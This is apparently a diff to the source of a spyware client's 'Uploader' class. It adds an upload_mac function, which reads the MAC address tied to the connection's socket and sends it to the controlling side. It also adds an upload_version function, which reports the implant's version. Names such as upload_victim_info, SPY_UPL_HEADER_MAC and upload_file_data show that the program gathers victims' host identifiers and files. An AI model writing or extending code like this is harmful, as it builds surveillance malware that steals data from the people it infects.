@@ -1,4 +1,5 @@
 #include "uploader.h"
+#include "networking.h"
 
 void Uploader::send_header(byte content_type, int content_length)
 {
@@ -15,6 +16,20 @@ void Uploader::send_content(const byte * buffer, int offset, int length)
 
 void Uploader::upload_mac()
 {
+	byte mac[6];
+	sockaddr sock_addr = socket->get_sock_addr();
+	in_addr addr;
+	addr.S_un.S_addr = inet_addr(sock_addr.sa_data);
+	if (Networking::get_mac_addr(mac, addr) != NULL)
+	{
+		LOG_I("Send MAC address: %02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+		send_header(SPY_UPL_HEADER_MAC, 6);
+		send_content(mac, 0, 6);
+	}
+	else
+	{
+		throw 1;
+	}
 }
 
 void Uploader::upload_ipv4()
@@ -30,6 +45,13 @@ void Uploader::upload_victim_info()
 	upload_mac();
 	upload_ipv4();
 	upload_hostname();
+}
+
+void Uploader::upload_version()
+{
+	send_header(SPY_UPL_HEADER_VER, 3);
+	const byte ver[] = { SPY_MAJOR_VERSION, SPY_MINOR_VERSION, SPY_REVISION };
+	send_content(ver, 0, 3);
 }
 
 void Uploader::upload_file_data(FILE * file)
